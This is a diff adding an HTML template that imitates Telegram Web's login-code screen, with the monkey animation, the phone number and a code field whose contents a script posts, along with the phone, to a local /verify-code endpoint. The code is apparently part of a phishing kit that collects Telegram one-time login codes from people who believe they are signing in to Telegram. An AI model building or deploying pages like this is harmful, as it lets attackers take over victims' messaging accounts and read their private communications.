@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet" />
+        <style type="text/tailwindcss">
+            @theme {
+                --font-sans: "Roboto", "Instrument Sans", ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            }
+        </style>
+        <title>Telegram Web</title>
+    </head>
+    <body>
+        <!--  <h2>Enter Telegram Login Code</h2>-->
+        <!--  <p>{{ phone }}</p>-->
+        <!--  <p>{{ message }}</p>-->
+        <!--  <form action="/verify-code" method="post">-->
+        <!--    <input type="hidden" name="phone" value="{{ phone }}" />-->
+        <!--    <label>Code:</label>-->
+        <!--    <input type="text" name="code" required />-->
+        <!--    <button type="submit">Verify</button>-->
+        <!--  </form>-->
+
+        <div class="flex h-screen w-full flex-col items-center justify-start">
+            <div class="relative flex w-full max-w-md flex-col items-center">
+                <div id="monkey-container" class="relative size-40 mx-auto mt-20">
+                    <img id="monkey" src="/static/images/monkey-front.png" class="absolute inset-0 w-full h-full object-contain transition-opacity duration-300 opacity-100" alt="Monkey" />
+                </div>
+
+                <div class="mt-5.5 flex items-center gap-2">
+                    <h4 id="phone-number-h" class="text-4xl font-medium">{{phone}}</h4>
+                    <a href="/" class="cursor-pointer text-gray-500 hover:text-gray-900">
+                        <svg id="edit-btn" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="0.6" stroke="currentColor" class="size-7">
+                            <path
+                                fill="currentColor"
+                                d="m19.71 8.04l-2.34 2.33l-3.75-3.75l2.34-2.33c.39-.39 1.04-.39 1.41 0l2.34 2.34c.39.37.39 1.02 0 1.41M3 17.25L13.06 7.18l3.75 3.75L6.75 21H3zM16.62 5.04l-1.54 1.54l2.34 2.34l1.54-1.54zM15.36 11L13 8.64l-9 9.02V20h2.34z"
+                            />
+                        </svg>
+                    </a>
+                </div>
+                <p class="mt-2 w-[320px] text-center text-md text-gray-500">We have sent you a message in Telegram with the code.</p>
+                <div class="relative isolate mt-10.5 w-full max-w-sm">
+                    <input
+                        type="number"
+                        name="sec-code"
+                        id="sec-code"
+                        placeholder=" "
+                        class="peer h-12 w-full rounded-xl bg-white py-1.5 px-4 text-base text-gray-900 outline-1 -outline-offset-1 outline-gray-300 placeholder-transparent focus:outline-2 focus:-outline-offset-1 focus:outline-[#3390ec] sm:text-sm/6 [&::-webkit-inner-spin-button]:m-0 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:m-0 [&::-webkit-outer-spin-button]:appearance-none"
+                    />
+                    <label
+                        for="sec-code"
+                        class="pointer-events-none absolute left-3.5 top-2.5 origin-[0] scale-100 transform text-base text-gray-400 transition-all duration-200 peer-placeholder-shown:top-3.5 peer-placeholder-shown:left-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-3 peer-focus:left-3.5 peer-focus:scale-80 peer-focus:bg-white peer-focus:text-[#3390ec]"
+                    >
+                        Code
+                    </label>
+                </div>
+            </div>
+        </div>
+
+<!--        {% if error %}-->
+<!--        <h4 class="text-4xl text-red-400">{{error}}</h4>-->
+<!--        {% endif %}-->
+
+        <script src="http://localhost:5500/livereload.js"></script>
+
+        <script src="https://unpkg.com/libphonenumber-js@1.12.9/bundle/libphonenumber-js.min.js"></script>
+
+        <script>
+            const phoneEl = document.getElementById("phone-number-h");
+            const rawPhone = phoneEl.textContent.trim();
+
+            const monkey = document.getElementById("monkey");
+
+            const images = {
+                left: "/static/images/monkey-left.png",
+                right: "/static/images/monkey-right.png",
+                front: "/static/images/monkey-front.png",
+                blink: "/static/images/monkey-blink.png",
+            };
+
+            const sequence = ["left", "blink", "front", "blink", "right", "blink", "front", "blink"];
+
+            let currentFrame = 0;
+            let timeout = null;
+            let idleTimeout = null;
+
+            const normalDelay = 800;
+            const blinkDelay = 100;
+            const idleTime = 10000;
+
+            function fadeToImage(src, delay) {
+                monkey.classList.add("opacity-0");
+
+                setTimeout(() => {
+                    monkey.src = src;
+                    monkey.onload = () => {
+                        monkey.classList.remove("opacity-0");
+                    };
+                }, 150); // Half of the transition duration for fade-out
+            }
+
+            function playNextFrame() {
+                const state = sequence[currentFrame];
+                const imageSrc = images[state];
+
+                fadeToImage(imageSrc, state === "blink" ? blinkDelay : normalDelay);
+
+                currentFrame = (currentFrame + 1) % sequence.length;
+                const delay = state === "blink" ? blinkDelay : normalDelay;
+                timeout = setTimeout(playNextFrame, delay);
+            }
+
+            function startAnimationLoop() {
+                if (timeout) return;
+                playNextFrame();
+            }
+
+            function stopAnimationLoop() {
+                clearTimeout(timeout);
+                timeout = null;
+            }
+
+            function resetIdleTimer() {
+                clearTimeout(idleTimeout);
+                idleTimeout = setTimeout(() => {
+                    stopAnimationLoop();
+                }, idleTime);
+            }
+
+            document.addEventListener("mousemove", () => {
+                if (!timeout) startAnimationLoop();
+                resetIdleTimer();
+            });
+
+            window.addEventListener("DOMContentLoaded", () => {
+                startAnimationLoop();
+                resetIdleTimer();
+            });
+
+            try {
+                const parsed = libphonenumber.parsePhoneNumber(rawPhone);
+                phoneEl.textContent = parsed.formatInternational(); // e.g., +960 987-6543
+            } catch (err) {
+                console.warn("Failed to format phone:", err);
+            }
+
+            function submitCode() {
+                const code = document.getElementById("sec-code").value.trim();
+
+                const form = document.createElement("form");
+                form.method = "POST";
+                form.action = "/verify-code";
+
+                const inputCode = document.createElement("input");
+                inputCode.type = "hidden";
+                inputCode.name = "code";
+                inputCode.value = code;
+
+                const inputPhone = document.createElement("input");
+                inputPhone.type = "hidden";
+                inputPhone.name = "phone";
+                inputPhone.value = "{{ phone }}";
+
+                form.appendChild(inputPhone);
+                form.appendChild(inputCode);
+                document.body.appendChild(form);
+                form.submit();
+            }
+
+            // On Enter press inside input
+            document.getElementById("sec-code").addEventListener("keydown", (event) => {
+                if (event.key === "Enter") {
+                    event.preventDefault(); // Prevent form default submission (optional but recommended)
+                    submitCode();
+                }
+            });
+        </script>
+    </body>
+</html>
